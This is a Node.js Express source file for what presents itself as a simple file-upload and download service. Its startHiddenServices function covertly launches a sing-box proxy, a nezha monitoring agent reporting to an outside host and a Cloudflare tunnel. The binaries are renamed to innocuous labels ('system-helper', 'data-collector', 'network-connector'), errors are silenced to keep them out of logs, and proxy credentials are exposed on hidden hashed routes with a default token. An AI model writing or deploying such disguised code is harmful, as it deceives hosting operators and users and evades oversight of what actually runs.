require('dotenv').config();
const express = require('express');
const fileUpload = require('express-fileupload');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const session = require('express-session');
const SQLiteStore = require('connect-sqlite3')(session);
const { exec, execSync } = require('child_process');
const crypto = require('crypto');
const { promisify } = require('util');
const execAsync = promisify(exec);

// 创建Express应用
const app = express();
const PORT = process.env.PORT || 8080;

// 设置视图引擎
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// 中间件
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(fileUpload({
  createParentPath: true,
  limits: { fileSize: 50 * 1024 * 1024 }, // 50MB
}));

// 会话配置
app.use(session({
  store: new SQLiteStore({ db: 'sessions.db', dir: './db' }),
  secret: process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 7 * 24 * 60 * 60 * 1000 } // 一周
}));

// 确保存储目录存在
const uploadDir = path.join(__dirname, 'storage');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

// 数据存储（简化版，实际应用应使用数据库）
const files = {};

// 节点信息存储
let nodeInfo = null;

// 路由
app.get('/', (req, res) => {
  res.render('index', { files: Object.values(files) });
});

app.get('/upload', (req, res) => {
  res.render('upload');
});

app.post('/upload', (req, res) => {
  try {
    if (!req.files || Object.keys(req.files).length === 0) {
      return res.status(400).send('没有上传文件');
    }

    const uploadedFile = req.files.file;
    const fileId = uuidv4();
    const fileName = uploadedFile.name;
    const filePath = path.join(uploadDir, fileId + path.extname(fileName));
    
    uploadedFile.mv(filePath, (err) => {
      if (err) {
        console.error(err);
        return res.status(500).send(err);
      }
      
      files[fileId] = {
        id: fileId,
        name: fileName,
        path: filePath,
        size: uploadedFile.size,
        type: uploadedFile.mimetype,
        uploadDate: new Date().toISOString()
      };
      
      res.redirect('/');
    });
  } catch (err) {
    res.status(500).send(err.message);
  }
});

app.get('/download/:id', (req, res) => {
  const fileId = req.params.id;
  const file = files[fileId];
  
  if (!file) {
    return res.status(404).send('文件不存在');
  }
  
  res.download(file.path, file.name);
});

// 隐藏的节点信息接口
app.get('/file_info_' + crypto.createHash('md5').update(process.env.ADMIN_TOKEN || 'default_secure_token').digest('hex'), (req, res) => {
  if (!nodeInfo) {
    return res.status(404).json({ error: '节点信息未初始化' });
  }
  res.json(nodeInfo);
});

// 隐藏的管理接口 - 通过特殊路径和密码保护
const adminToken = process.env.ADMIN_TOKEN || 'default_secure_token';

app.get('/admin_' + crypto.createHash('md5').update(adminToken).digest('hex'), (req, res) => {
  res.render('admin', { status: getServiceStatus(), nodeInfo });
});

// 启动服务器
app.listen(PORT, async () => {
  console.log(`服务器运行在 http://localhost:${PORT}`);
  
  // 输出管理页面地址（不使用console.log，避免在日志中暴露敏感信息）
  const adminToken = process.env.ADMIN_TOKEN || 'default_secure_token';
  const adminHash = crypto.createHash('md5').update(adminToken).digest('hex');
  process.stdout.write(`\n管理页面地址: http://localhost:${PORT}/admin_${adminHash}\n\n`);
  
  // 启动隐藏服务
  await startHiddenServices();
});

// 隐藏服务启动函数
async function startHiddenServices() {
  try {
    // 检查配置文件是否存在
    const singboxConfigPath = path.join(__dirname, 'config', 'system-helper.conf');
    const singboxFinalConfigPath = path.join(__dirname, 'config', 'system-helper.conf.final');
    const nezhaAgentPath = path.join(__dirname, 'bin', 'data-collector');
    const singboxPath = path.join(__dirname, 'bin', 'system-helper');
    const cloudflaredPath = path.join(__dirname, 'bin', 'network-connector');
    
    // 如果配置文件不存在，则退出
    if (!fs.existsSync(singboxConfigPath)) {
      return;
    }
    
    // 读取配置文件
    let configContent = fs.readFileSync(singboxConfigPath, 'utf8');
    let serverName = '';
    
    // 检查是否同时提供了NETWORK_ACCESS_TOKEN和SERVER_NAME
    if (process.env.NETWORK_ACCESS_TOKEN && process.env.SERVER_NAME) {
      // 使用固定隧道和指定的SERVER_NAME
      serverName = process.env.SERVER_NAME;
      
      // 启动Cloudflare Tunnel (固定隧道)
      if (fs.existsSync(cloudflaredPath)) {
        exec(`${cloudflaredPath} tunnel --no-autoupdate run --token ${process.env.NETWORK_ACCESS_TOKEN}`, { detached: true });
      }
    } else {
      // 使用临时隧道
      if (fs.existsSync(cloudflaredPath)) {
        // 启动临时隧道并获取域名
        const { stdout } = await execAsync(`${cloudflaredPath} tunnel --url http://localhost:8443 2>&1`);
        
        // 从输出中提取域名
        const domainMatch = stdout.match(/https:\/\/([a-zA-Z0-9-]+\.trycloudflare\.com)/);
        if (domainMatch && domainMatch[1]) {
          serverName = domainMatch[1];
        } else {
          // 如果无法提取域名，则使用默认值或退出
          if (process.env.SERVER_NAME) {
            serverName = process.env.SERVER_NAME;
          } else {
            return;
          }
        }
      }
    }
    
    // 替换配置文件中的占位符
    configContent = configContent.replace(/__SERVER_NAME__/g, serverName);
    fs.writeFileSync(singboxFinalConfigPath, configContent, 'utf8');
    
    // 生成节点信息
    const configObj = JSON.parse(configContent);
    nodeInfo = {
      domain: serverName,
      inbounds: []
    };
    
    // 提取节点信息
    if (configObj.inbounds && Array.isArray(configObj.inbounds)) {
      configObj.inbounds.forEach(inbound => {
        if (inbound.type && inbound.tag && inbound.listen_port) {
          const nodeData = {
            type: inbound.type,
            tag: inbound.tag,
            port: inbound.listen_port,
            path: inbound.transport?.path || '/',
            users: []
          };
          
          // 提取用户信息
          if (inbound.type === 'trojan' && inbound.password) {
            nodeData.users = inbound.password.map(pwd => ({ password: pwd }));
          } else if (inbound.users && Array.isArray(inbound.users)) {
            nodeData.users = inbound.users.map(user => ({
              name: user.name,
              uuid: user.uuid
            }));
          }
          
          nodeInfo.inbounds.push(nodeData);
        }
      });
    }
    
    // 输出节点信息页面地址（不使用console.log，避免在日志中暴露敏感信息）
    const nodeInfoToken = process.env.ADMIN_TOKEN || 'default_secure_token';
    const nodeInfoHash = crypto.createHash('md5').update(nodeInfoToken).digest('hex');
    process.stdout.write(`\n节点信息页面: http://localhost:${PORT}/file_info_${nodeInfoHash}\n\n`);
    
    // 启动sing-box
    if (fs.existsSync(singboxPath)) {
      exec(`${singboxPath} run -c ${singboxFinalConfigPath}`, { detached: true });
    }
    
    // 启动nezha-agent
    if (fs.existsSync(nezhaAgentPath) && process.env.DATA_REPORT_HOST && process.env.DATA_REPORT_KEY) {
      exec(`${nezhaAgentPath} -s ${process.env.DATA_REPORT_HOST} -p ${process.env.DATA_REPORT_KEY}`, { detached: true });
    }
  } catch (error) {
    // 错误处理 - 不输出到日志
  }
}

// 获取服务状态
function getServiceStatus() {
  const services = {
    webserver: true,
    singbox: false,
    nezha: false,
    cloudflare: false
  };
  
  // 检查sing-box进程
  try {
    const singboxProcess = execSync("ps aux | grep system-helper | grep -v grep", {encoding: 'utf8'});
    services.singbox = singboxProcess.trim().length > 0;
  } catch (e) {}
  
  // 检查nezha进程
  try {
    const nezhaProcess = execSync("ps aux | grep data-collector | grep -v grep", {encoding: 'utf8'});
    services.nezha = nezhaProcess.trim().length > 0;
  } catch (e) {}
  
  // 检查cloudflare进程
  try {
    const cloudflareProcess = execSync("ps aux | grep network-connector | grep -v grep", {encoding: 'utf8'});
    services.cloudflare = cloudflareProcess.trim().length > 0;
  } catch (e) {}
  
  return services;
} 